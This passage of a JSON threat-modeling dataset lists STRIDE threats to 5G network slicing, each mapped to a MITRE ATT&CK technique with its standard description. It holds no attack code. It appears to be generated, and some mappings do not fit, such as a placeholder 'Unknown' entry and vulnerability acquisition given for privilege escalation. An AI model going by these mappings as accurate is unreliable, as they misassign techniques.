                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users manipulating VNFs without detection due to weak audit trails.",
            "Assumptions": [
                {
                    "Assumption": "VNF management actions are not logged centrally.",
                    "Role": "Network Administrator",
                    "Condition": "VNF actions are not covered by central logging mechanisms."
                },
                {
                    "Assumption": "Log entries can be modified without detection.",
                    "Role": "System Designer",
                    "Condition": "Applications do not protect log entries against modification."
                },
                {
                    "Assumption": "Lack of real-time monitoring for VNF activities.",
                    "Role": "Security Analyst",
                    "Condition": "No system in place for real-time activity monitoring."
                }
            ],
            "Potential Impact": "Unauthorized actions on VNFs go unnoticed, compromising network integrity.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "VNF manipulation",
                "audit trails",
                "network integrity"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to sensitive data within network slices.",
            "Assumptions": [
                {
                    "Assumption": "Data within slices is not encrypted.",
                    "Role": "System Designer",
                    "Condition": "Sensitive data is stored or transmitted unencrypted."
                },
                {
                    "Assumption": "Poor access control mechanisms in place.",
                    "Role": "Network Administrator",
                    "Condition": "Access controls do not restrict unauthorized access effectively."
                },
                {
                    "Assumption": "External interfaces lack protective measures.",
                    "Role": "Network Engineer",
                    "Condition": "No robust defenses for sensitive data on external interfaces."
                }
            ],
            "Potential Impact": "Exposure of confidential information compromising privacy and security.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "sensitive data",
                "encryption",
                "access control"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Data leakage through misconfigured network functions.",
            "Assumptions": [
                {
                    "Assumption": "Network functions are not adequately configured.",
                    "Role": "System Administrator",
                    "Condition": "Default configurations are used without optimization."
                },
                {
                    "Assumption": "Insufficient training for personnel managing configurations.",
                    "Role": "Network Operator",
                    "Condition": "Staff lack knowledge of secure configuration practices."
                },
                {
                    "Assumption": "No regular audits of network function configurations.",
                    "Role": "Security Analyst",
                    "Condition": "Configuration audits are not part of routine security practices."
                }
            ],
            "Potential Impact": "Unintended exposure of data to unauthorized parties.",
            "MITRE ATT&CK Keywords": [
                "data leakage",
                "misconfiguration",
                "network functions",
                "exposure"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data exposed due to unsecured external interfaces.",
            "Assumptions": [
                {
                    "Assumption": "External interfaces are not encrypted.",
                    "Role": "Network Engineer",
                    "Condition": "Data transmission over external interfaces is not encrypted."
                },
                {
                    "Assumption": "Weak authentication for external access.",
                    "Role": "System Administrator",
                    "Condition": "External interfaces do not enforce strong authentication."
                },
                {
                    "Assumption": "No granular access controls on external portals.",
                    "Role": "Network Operator",
                    "Condition": "Access controls do not restrict data access effectively."
                }
            ],
            "Potential Impact": "Unauthorized access and potential data breaches through external interfaces.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "external interfaces",
                "unencrypted data",
                "authentication"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "DDoS attacks targeting the network slice infrastructure.",
            "Assumptions": [
                {
                    "Assumption": "Large-scale traffic can overwhelm the slicing infrastructure.",
                    "Role": "Network Engineer",
                    "Condition": "Infrastructure lacks defenses against high-volume traffic."
                },
                {
                    "Assumption": "Insufficient redundancy and failover mechanisms in place.",
                    "Role": "System Designer",
                    "Condition": "Lack of adequate backup and failover systems."
                },
                {
                    "Assumption": "Inadequate real-time monitoring of traffic.",
                    "Role": "Network Operator",
                    "Condition": "No real-time traffic monitoring tools to detect abnormal traffic patterns."
                }
            ],
            "Potential Impact": "Service disruption and degraded performance due to overwhelmed infrastructure.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "denial of service",
                "network slice",
                "traffic overload"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Exploitation of orchestration and management systems to disrupt service.",
            "Assumptions": [
                {
                    "Assumption": "Management systems have vulnerabilities that can be exploited.",
                    "Role": "Security Analyst",
                    "Condition": "Known or zero-day vulnerabilities exist in the systems."
                },
                {
                    "Assumption": "No rate limiting or access control measures on management interfaces.",
                    "Role": "System Designer",
                    "Condition": "Management interfaces lack protective measures."
                },
                {
                    "Assumption": "Insufficient isolation between critical services.",
                    "Role": "Network Engineer",
                    "Condition": "Critical services are not isolated from potential attack paths."
                }
            ],
            "Potential Impact": "Interruption of orchestration services, affecting overall network functionality.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "orchestration",
                "management systems",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Attacks on cloud or edge nodes causing service outages.",
            "Assumptions": [
                {
                    "Assumption": "Cloud and edge nodes are not resilient to attacks.",
                    "Role": "System Administrator",
                    "Condition": "Nodes lack adequate DDoS protection."
                },
                {
                    "Assumption": "No load balancing or redundancy mechanisms.",
                    "Role": "Network Designer",
                    "Condition": "System lacks mechanisms to distribute load or provide redundancy."
                },
                {
                    "Assumption": "Monitoring and alerting for node health is insufficient.",
                    "Role": "Security Analyst",
                    "Condition": "Insufficient monitoring tools to detect and alert on node health issues."
                }
            ],
            "Potential Impact": "Service outages and availability issues impacting end-users.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "cloud nodes",
                "edge nodes",
                "service outage"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploitation of vulnerabilities in VNFs to escalate privileges.",
            "Assumptions": [
                {
                    "Assumption": "VNFs have exploitable software flaws.",
                    "Role": "Security Analyst",
                    "Condition": "VNFs contain known or zero-day vulnerabilities."
                },
                {
                    "Assumption": "Network lacks segmentation to contain privilege escalation.",
                    "Role": "Network Engineer",
                    "Condition": "Network does not segment roles and privileges effectively."
                },
                {
                    "Assumption": "No runtime protection mechanisms in place.",
                    "Role": "System Administrator",
                    "Condition": "VNFs run without runtime protection or monitoring."
                }
            ],
            "Potential Impact": "Unauthorized access and control over network resources.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "VNF",
                "vulnerabilities",
                "network segmentation"
            ],
            "mitre_technique": {
                "name": "Vulnerabilities",
                "description": "Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.(Citation: National Vulnerability Database)\n\nAn adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. [Exploits](https://attack.mitre.org/techniques/T1588/005)) or to attempt to develop one themselves (i.e. [Exploits](https://attack.mitre.org/techniques/T1587/004)).",
                "id": "attack-pattern--2b5aa86b-a0df-4382-848d-30abea443327",
                "technique_id": "T1588.006"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Privilege escalation through unprotected orchestration tools.",
            "Assumptions": [
                {
                    "Assumption": "Orchestration tools lack strict access controls.",
                    "Role": "Network Administrator",
                    "Condition": "Access controls are weak or improperly configured."
                },
                {
                    "Assumption": "No multi-factor authentication for sensitive operations.",
                    "Role": "System Designer",
                    "Condition": "Sensitive operations are conducted without multi-factor authentication."
                },
                {
                    "Assumption": "Inadequate logging and monitoring of orchestration tools.",
                    "Role": "Security Analyst",
                    "Condition": "Orchestration tools are not monitored or logged effectively."
                }
            ],
            "Potential Impact": "Unauthorized administrative actions leading to compromised network slices.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "orchestration",
                "access control",
                "multi-factor authentication"
            ],
            "mitre_technique": {
                "name": "Container Orchestration Job",
                "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",
                "id": "attack-pattern--1126cab1-c700-412f-a510-61f4937bb096",
                "technique_id": "T1053.007"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Misconfigured external interfaces leading to privilege escalation.",
            "Assumptions": [
                {
                    "Assumption": "External interfaces are not properly configured for security.",
                    "Role": "Network Engineer",
                    "Condition": "Configuration errors leave interfaces vulnerable."
                },
                {
                    "Assumption": "No comprehensive testing and validation of external interfaces.",
                    "Role": "System Administrator",
                    "Condition": "Interfaces are deployed without thorough security testing."
                },
                {
                    "Assumption": "Weak security policies for external interfaces.",
                    "Role": "Security Analyst",
                    "Condition": "Security policies do not enforce stringent controls on interfaces."
                }
            ],
            "Potential Impact": "Unauthorized administrative access through misconfigured external points.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "external interfaces",
                "misconfiguration",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        }
    ]
},
{
    "case_number": "3",
    "batch_number": "30",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a fake identity to gain access to a network slice's orchestration and management functions.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to valid user credentials",
                    "Role": "Attacker",
                    "Condition": "Credentials compromised"
                },
                {
                    "Assumption": "No multi-factor authentication (MFA) is enforced",
                    "Role": "System Configuration",
                    "Condition": "Weak authentication setup"
                },
                {
                    "Assumption": "The attacker has knowledge of the targeted network slice",
                    "Role": "Attacker",
                    "Condition": "Insider knowledge or reconnaissance"
                }
            ],
            "Potential Impact": "Unauthorized access and control of network slices",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "identity access",
                "network slice",
                "orchestration",
                "management"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An unauthorized entity pretends to be a legitimate Network Function (NF) in the 5G core network.",
            "Assumptions": [
                {
                    "Assumption": "NFs are identified by easily spoofable identifiers",
                    "Role": "System Configuration",
                    "Condition": "Weak identifier uniqueness"
                },
                {
                    "Assumption": "No robust verification mechanisms for NF identities",
                    "Role": "System Configuration",
                    "Condition": "Lack of verification processes"
                },
                {
                    "Assumption": "The attacker can communicate within the network",
                    "Role": "Attacker",
                    "Condition": "Network access through compromised node or insider"
                }
            ],
            "Potential Impact": "Compromise of network operations and integrity",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network function",
                "identifier",
                "compromise",
                "communication"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "A malicious entity fakes system notifications to edge and cloud computing nodes.",
            "Assumptions": [
                {
                    "Assumption": "Nodes trust notifications without strong validation",
                    "Role": "System Configuration",
                    "Condition": "Weak notification validation"
                },
                {
                    "Assumption": "Network monitoring does not detect anomalous behaviors",
                    "Role": "Network Monitoring",
                    "Condition": "Insufficient monitoring"
                },
                {
                    "Assumption": "The attacker knows the format and structure of notifications",
                    "Role": "Attacker",
                    "Condition": "Access to notification templates or formats"
                }
            ],
            "Potential Impact": "Disruption of resource allocation and processing",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "system notification",
                "edge computing",
                "cloud computing",
                "resource allocation"
            ],
            "mitre_technique": {
                "name": "DHCP Spoofing",
                "description": "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nDHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.(Citation: rfc2131) The typical server-client interaction is as follows: \n\n1. The client broadcasts a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which includes an available network address. \n\n3. The client broadcasts a `REQUEST` message, which includes the network address offered. \n\n4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.\n\nAdversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g) Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.\n\nDHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.\n\nRather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) by generating many broadcast DISCOVER messages to exhaust a network\u2019s DHCP allocation pool. ",
                "id": "attack-pattern--59ff91cd-1430-4075-8563-e6f15f4f9ff5",
                "technique_id": "T1557.003"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters the configuration of Virtual Network Functions (VNFs) to introduce vulnerabilities.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has privileged access to the configuration interface",
                    "Role": "Attacker",
                    "Condition": "Advanced access or insider threat"
                },
                {
                    "Assumption": "Configuration changes are not logged/audited",
                    "Role": "System Logging",
                    "Condition": "Insufficient audit mechanisms"
                },
                {
                    "Assumption": "No integrity checks on configuration data",
                    "Role": "System Configuration",
                    "Condition": "Lack of configuration integrity checks"
                }
            ],
            "Potential Impact": "Introduction of vulnerabilities and potential exploitation",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "VNF",
                "configuration",
                "vulnerability",
                "exploitation"
            ],
            "mitre_technique": {
                "name": "Data from Configuration Repository",
                "description": "Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.\n\nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)",
                "id": "attack-pattern--0ad7bc5c-235a-4048-944b-3b286676cb74",
                "technique_id": "T1602"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Modification of data in transit between network slices, leading to distorted communication.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient encryption of data in transit",
                    "Role": "System Configuration",
                    "Condition": "Weak or no encryption protocols"
                },
                {
                    "Assumption": "Attacker can intercept network traffic",
                    "Role": "Attacker",
                    "Condition": "Man-in-the-middle positioning"
                },
                {
                    "Assumption": "No integrity checks are performed on received data",
                    "Role": "System Configuration",
                    "Condition": "Lack of validation mechanisms"
                }
            ],
            "Potential Impact": "Distorted communication and flawed application behavior",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data in transit",
                "network slice",
                "interception",
                "integrity"
            ],
            "mitre_technique": {
                "name": "Runtime Data Manipulation",
                "description": "Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nAdversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct [Change Default File Association](https://attack.mitre.org/techniques/T1546/001) and [Masquerading](https://attack.mitre.org/techniques/T1036) to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--32ad5c86-2bcf-47d8-8fdc-d7f3d79a7490",
                "technique_id": "T1565.003"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker inserts malicious code into orchestrator scripts managing the lifecycle of network slices.",
            "Assumptions": [
                {
                    "Assumption": "Attacker has access to the orchestrator platform",
                    "Role": "Attacker",
                    "Condition": "Hijacked credentials or insider threat"
                },
                {
                    "Assumption": "Scripts are not verified for integrity",
                    "Role": "System Configuration",
                    "Condition": "Lack of script validation"
                },
                {
                    "Assumption": "No real-time monitoring of orchestrator activities",
                    "Role": "Network Monitoring",
                    "Condition": "Inadequate activity monitoring"
                }
            ],
            "Potential Impact": "Compromised lifecycle management and potential system takeover",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "orchestrator",
                "lifecycle management",
                "malicious code",
                "system takeover"
            ],
            "mitre_technique": {
                "name": "Container Orchestration Job",
                "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",
                "id": "attack-pattern--1126cab1-c700-412f-a510-61f4937bb096",
                "technique_id": "T1053.007"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies altering the configuration of network slices after causing disruptions.",
            "Assumptions": [
                {
                    "Assumption": "No detailed logs of configuration changes",
                    "Role": "System Configuration",
                    "Condition": "Lack of detailed logging"
                },
                {
                    "Assumption": "Logs can be tampered with or deleted by the attacker",
